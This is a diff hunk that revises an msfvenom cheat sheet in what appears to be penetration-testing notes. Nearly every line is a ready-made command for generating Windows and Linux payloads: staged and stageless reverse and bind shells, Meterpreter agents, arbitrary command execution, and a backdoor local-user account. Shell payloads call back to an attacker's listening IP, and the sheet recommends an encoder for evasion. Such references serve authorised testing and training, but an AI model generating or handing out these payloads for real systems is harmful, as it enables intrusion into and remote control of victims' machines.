@@ -674,35 +674,50 @@ msfpc.sh Linux <IP> <PORT> CMD REVERSE STAGELESS TCP
 msfpc.sh Linux <IP> <PORT> MSF REVERSE STAGED TCP
 ```
 
-MsfVenom cheat sheet:
+`msfvenom` cheat sheet:
 
 ```
 # List platforms: msfvenom --help-platforms
 # Basic platforms: windows & linux
-# Architecture: x86 or x64
+# -a <ARCH> (Architecture): x86 or x64
 # List payloads: msfvenom --list payloads
 # List formats: msfvenom --help-formats
 # List encoders: msfvenom --list encoders
 # Recommended encoder: -e x86/shikata_ga_nai
 
-msfvenom –p <PAYLOAD> [--platform <PLATEFORM>] [-a <ARCHI>] [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> [–f <FORMAT>] > <FILE>
+msfvenom [-a <ARCH>] [--platform <PLATEFORM>] –p <PAYLOAD> [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> [–f <FORMAT>] > <FILE>
 
 # Windows payloads
-msfvenom -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > prompt.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
-msfvenom -p windows/meterpreter/bind_tcp LPORT=<LISTENING_PORT> -f exe > bind.exe
-msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe
+
+# Staged payloads
+msfvenom -a <x86 | x64> -p <windows/shell/reverse_tcp | windows/x64/shell/reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
+msfvenom -a <x86 | x64> -p <windows/meterpreter/reverse_tcp | windows/x64/meterpreter/reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
+msfvenom -a <x86 | x64> -p <windows/meterpreter/bind_tcp | windows/x64/meterpreter/bind_tcp>  LPORT=<LISTENING_PORT> -f exe > bind.exe
+
+# Stageless payloads
+msfvenom -a <x86 | x64> -p <windows/shell_reverse_tcp | windows/x64/shell_reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
+msfvenom -a <x86 | x64> -p <windows/meterpreter_reverse_tcp | windows/x64/meterpreter_reverse_tcp> LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
+msfvenom -a <x86 | x64> -p <windows/meterpreter_bind_tcp | windows/x64/meterpreter_bind_tcp> LPORT=<LISTENING_PORT> -f exe > bind.exe
+
+# Unitary command execution
+msfvenom -a <x86 | x64> -p <windows/exec | windows/x64/exec> CMD="<COMMAND>" -f <FORMAT> > <OUTPUT_FILENAME>
+
+# Adds a local user.
+msfvenom -a <x86 | x64> -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe
 
 # Linux payloads
+
 # Bash oneliner
 msfvenom -p cmd/unix/reverse_bash LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > shell.sh
 # Basic and stable
 msfvenom -p generic/shell_bind_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > term.elf
+
 # Stageless - CMD shell
 msfvenom -p linux/x86/shell_bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_stageless.elf
 msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > rev_stageless.elf
 msfvenom -p linux/x64/shell_bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_x64_stageless.elf
 msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > rev_x64_stageless.elf
+
 # Staged - Meterpreter
 msfvenom -p linux/x86/meterpreter/bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_meterpreter.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux -a x86 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > reverse_meterpreter.elf
